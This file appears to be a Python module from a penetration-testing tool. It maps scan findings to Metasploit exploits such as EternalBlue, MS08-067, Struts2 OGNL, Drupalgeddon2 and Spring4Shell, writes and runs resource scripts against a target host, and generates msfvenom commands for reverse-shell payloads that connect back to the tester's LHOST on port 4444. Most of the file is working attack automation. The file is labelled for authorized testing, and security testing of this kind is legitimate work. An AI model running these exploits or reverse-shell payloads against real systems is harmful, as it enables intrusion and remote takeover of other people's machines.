#!/usr/bin/env python3
"""
Metasploit Integration — Cyberburg v4 DARK MATTER
Generates Metasploit resource scripts (.rc) from scan findings and
optionally executes them. Also interfaces with msfvenom for payload hints.

AUTHORIZED PENETRATION TESTING ONLY.
"""

import os
import re
import json

from utils.helpers import run_command, get_timestamp, sanitize_filename, get_filename_timestamp
from utils.tool_checker import check_tool
from utils.banner import print_info, print_success, print_warning, print_error
from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

# ─── MSF Module Mapping ────────────────────────────────────────────────────────

# Maps finding types → Metasploit modules
MSF_MODULE_MAP = {
    # Scanners / Auxiliary
    "port":                 ("auxiliary/scanner/portscan/tcp",       {}),
    "smb":                  ("auxiliary/scanner/smb/smb_ms17_010",   {}),
    "http":                 ("auxiliary/scanner/http/http_version",  {}),
    "ftp":                  ("auxiliary/scanner/ftp/anonymous",      {}),
    "ssh":                  ("auxiliary/scanner/ssh/ssh_version",    {}),
    "rdp":                  ("auxiliary/scanner/rdp/rdp_scanner",    {}),
    "vnc":                  ("auxiliary/scanner/vnc/vnc_none_auth",  {}),
    "telnet":               ("auxiliary/scanner/telnet/telnet_version", {}),
    "mysql":                ("auxiliary/scanner/mysql/mysql_version", {}),
    "mssql":                ("auxiliary/scanner/mssql/mssql_ping",   {}),
    "mongodb":              ("auxiliary/scanner/mongodb/mongodb_login", {}),
    "redis":                ("auxiliary/scanner/redis/redis_server", {}),

    # Exploits
    "struts":               ("exploit/multi/http/struts2_content_type_ognl", {"TARGET": "0"}),
    "cve-2017-5638":        ("exploit/multi/http/struts2_content_type_ognl", {"TARGET": "0"}),
    "drupalgeddon":         ("exploit/unix/webapp/drupal_drupalgeddon2",      {}),
    "cve-2018-7600":        ("exploit/unix/webapp/drupal_drupalgeddon2",      {}),
    "spring4shell":         ("exploit/multi/http/spring_framework_rce_spring_messaging", {}),
    "cve-2022-22965":       ("exploit/multi/http/spring_framework_rce_spring_messaging", {}),
    "ghostcat":             ("auxiliary/admin/http/tomcat_ghostcat", {}),
    "cve-2020-1938":        ("auxiliary/admin/http/tomcat_ghostcat", {}),
    "heartbleed":           ("auxiliary/scanner/ssl/openssl_heartbleed", {}),
    "phpmyadmin":           ("auxiliary/scanner/http/phpmyadmin_login", {}),
    "wordpress":            ("auxiliary/scanner/http/wordpress_login_enum", {}),
    "joomla":               ("auxiliary/scanner/http/joomla_version", {}),
    "sql injection":        ("auxiliary/scanner/http/sqlmap", {}),
    "default credential":   ("auxiliary/scanner/http/http_default_accounts", {}),
    "smb ms17-010":         ("exploit/windows/smb/ms17_010_eternalblue", {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"}),
    "eternalblue":          ("exploit/windows/smb/ms17_010_eternalblue", {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"}),
    "ms08-067":             ("exploit/windows/smb/ms08_067_netapi",      {"PAYLOAD": "windows/meterpreter/reverse_tcp"}),
}

PAYLOAD_SUGGESTIONS = {
    "linux":   ["linux/x64/meterpreter/reverse_tcp", "linux/x64/shell_reverse_tcp"],
    "windows": ["windows/x64/meterpreter/reverse_tcp", "windows/meterpreter/reverse_tcp"],
    "php":     ["php/meterpreter_reverse_tcp", "php/reverse_php"],
    "java":    ["java/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp"],
    "python":  ["python/meterpreter/reverse_tcp", "python/shell_reverse_tcp"],
}


def _extract_target_info(session_obj) -> dict:
    """Extract target OS, open ports, and services from session modules."""
    info = {"ip": session_obj.ip, "ports": [], "services": [], "os": "unknown", "findings_text": ""}

    combined = ""
    for module in session_obj.modules:
        combined += module.get("raw", "").lower()
        for finding in module.get("findings", []):
            combined += " " + finding.get("value", "").lower()

        # Extract ports
        for port_entry in module.get("ports", []):
            info["ports"].append(port_entry)

    info["findings_text"] = combined

    # Detect OS
    if "windows" in combined or "iis" in combined or "microsoft" in combined:
        info["os"] = "windows"
    elif "linux" in combined or "ubuntu" in combined or "debian" in combined or "centos" in combined:
        info["os"] = "linux"
    elif "freebsd" in combined or "openbsd" in combined:
        info["os"] = "bsd"

    return info


def generate_msf_resource_script(session_obj, output_dir: str, lhost: str = None) -> str:
    """Generate a Metasploit resource script (.rc) based on scan findings."""
    loot_dir = os.path.join(output_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)

    target_info = _extract_target_info(session_obj)
    ip = session_obj.ip
    findings_text = target_info["findings_text"]
    os_type = target_info["os"]

    if not lhost:
        lhost = _get_local_ip()

    # Select relevant MSF modules
    selected_modules = []
    for keyword, (module, extra_opts) in MSF_MODULE_MAP.items():
        if keyword.lower() in findings_text:
            selected_modules.append((module, extra_opts))

    # Always include basic scanners
    base_modules = [
        ("auxiliary/scanner/http/http_version",  {}),
        ("auxiliary/scanner/http/title",          {}),
        ("auxiliary/scanner/http/robots_txt",     {}),
    ]
    selected_modules = base_modules + [m for m in selected_modules if m not in base_modules]

    # Deduplicate
    seen = set()
    unique_modules = []
    for m in selected_modules:
        if m[0] not in seen:
            seen.add(m[0])
            unique_modules.append(m)

    # Payload suggestion
    payload = PAYLOAD_SUGGESTIONS.get(os_type, PAYLOAD_SUGGESTIONS["linux"])[0]

    # Build resource script
    lines = [
        "# ═══════════════════════════════════════════════════════════════",
        f"# Cyberburg v4 — Auto-Generated MSF Resource Script",
        f"# Target: {session_obj.target} ({ip})",
        f"# OS: {os_type} | LHOST: {lhost}",
        f"# Generated: {get_timestamp()}",
        "# AUTHORIZED PENETRATION TESTING ONLY",
        "# ═══════════════════════════════════════════════════════════════",
        "",
        f"setg RHOSTS {ip}",
        f"setg RHOST {ip}",
        f"setg LHOST {lhost}",
        f"setg LPORT 4444",
        f"setg THREADS 10",
        "",
    ]

    for module_path, extra_opts in unique_modules[:15]:  # Cap at 15 modules
        lines.append(f"use {module_path}")
        lines.append(f"set RHOSTS {ip}")
        lines.append(f"set RHOST {ip}")
        if "exploit" in module_path:
            lines.append(f"set PAYLOAD {payload}")
            lines.append(f"set LHOST {lhost}")
            lines.append(f"set LPORT 4444")
        for opt, val in extra_opts.items():
            lines.append(f"set {opt} {val}")
        lines.append("run -j")
        lines.append("")

    lines += [
        "# Wait for jobs",
        "sleep 5",
        "jobs -l",
        "",
        "# Sessions",
        "sessions -l",
    ]

    rc_content = "\n".join(lines)

    ts = get_filename_timestamp()
    rc_path = os.path.join(loot_dir, f"cyberburg_{sanitize_filename(session_obj.hostname)}_{ts}.rc")
    with open(rc_path, "w") as f:
        f.write(rc_content)

    return rc_path


def run_msf_resource(rc_path: str, output_dir: str) -> tuple:
    """Execute a Metasploit resource script if msfconsole is available."""
    if not check_tool("msfconsole"):
        return False, "msfconsole not found — install Metasploit Framework"

    log_path = rc_path.replace(".rc", "_output.txt")
    print_info(f"Running msfconsole with: {os.path.basename(rc_path)}")
    print_warning("This will run real Metasploit modules — authorized targets only!")

    code, stdout, stderr = run_command([
        "msfconsole", "-q", "-r", rc_path,
        "-o", log_path,
    ], timeout=300)

    return code == 0, log_path


def msfvenom_payload_list(os_type: str, lhost: str, lport: str = "4444") -> list:
    """Generate useful msfvenom payload commands for the target OS."""
    if not check_tool("msfvenom"):
        return []

    suggestions = []
    payloads = PAYLOAD_SUGGESTIONS.get(os_type, PAYLOAD_SUGGESTIONS["linux"])

    for payload in payloads[:3]:
        if "windows" in payload:
            ext = "exe"
            fmt = "exe"
        elif "php" in payload:
            ext = "php"
            fmt = "raw"
        elif "java" in payload:
            ext = "jar"
            fmt = "jar"
        else:
            ext = "elf"
            fmt = "elf"

        cmd = (f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
               f"-f {fmt} -o shell.{ext}")
        suggestions.append({"payload": payload, "command": cmd, "output": f"shell.{ext}"})

    return suggestions


def run_metasploit_integration(session_obj, output_dir: str) -> dict:
    """Generate MSF resource script and optionally run it."""
    result = {
        "module": "Metasploit Integration",
        "target": session_obj.target,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": [],
        "rc_path": ""
    }

    print_info("Generating Metasploit resource script from scan findings...")
    loot_dir = os.path.join(output_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)

    # Generate resource script
    rc_path = generate_msf_resource_script(session_obj, output_dir)
    result["rc_path"] = rc_path
    result["findings"].append({
        "type": "MSF Resource Script Generated",
        "value": f"Ready to run: msfconsole -r {rc_path}",
        "severity": "INFO"
    })
    print_success(f"Resource script saved: {rc_path}")

    # Count selected modules
    with open(rc_path) as f:
        content = f.read()
    module_count = content.count("\nuse ")
    result["raw"] = f"Generated {module_count} MSF modules based on scan findings"

    # Payload suggestions
    target_info = _extract_target_info(session_obj)
    os_type = target_info["os"]

    # Try to get LHOST
    code, stdout, _ = run_command(["hostname", "-I"], timeout=5)
    lhost = stdout.strip().split()[0] if stdout.strip() else "YOUR_IP"

    payloads = msfvenom_payload_list(os_type, lhost)
    if payloads:
        result["findings"].append({
            "type": "Payload Suggestions",
            "value": f"msfvenom payload commands for {os_type} target saved to report",
            "severity": "INFO"
        })
        payload_path = os.path.join(loot_dir, "payload_suggestions.txt")
        with open(payload_path, "w") as f:
            f.write(f"# Payload Suggestions — {session_obj.target} ({os_type})\n\n")
            for p in payloads:
                f.write(f"# {p['payload']}\n{p['command']}\n\n")

    # Display summary table
    table = Table(title="Metasploit Integration Summary", box=box.SIMPLE, header_style="bold red")
    table.add_column("Item", style="cyan")
    table.add_column("Detail")
    table.add_row("Target OS", os_type)
    table.add_row("LHOST", lhost)
    table.add_row("MSF Modules Selected", str(module_count))
    table.add_row("Resource Script", os.path.basename(rc_path))
    table.add_row("MSF Available", "[bold green]YES[/bold green]" if check_tool("msfconsole") else "[dim]Not installed[/dim]")
    console.print(table)

    if check_tool("msfconsole"):
        console.print(f"\n  [bold yellow]Run now:[/bold yellow] msfconsole -r {rc_path}")
        result["findings"].append({
            "type": "MSF Ready to Execute",
            "value": f"Metasploit installed — run: msfconsole -r {rc_path}",
            "severity": "HIGH"
        })
    else:
        console.print("\n  [dim]Install Metasploit: https://metasploit.com/download[/dim]")
        console.print(f"  [dim]Then run: msfconsole -r {rc_path}[/dim]")

    return result
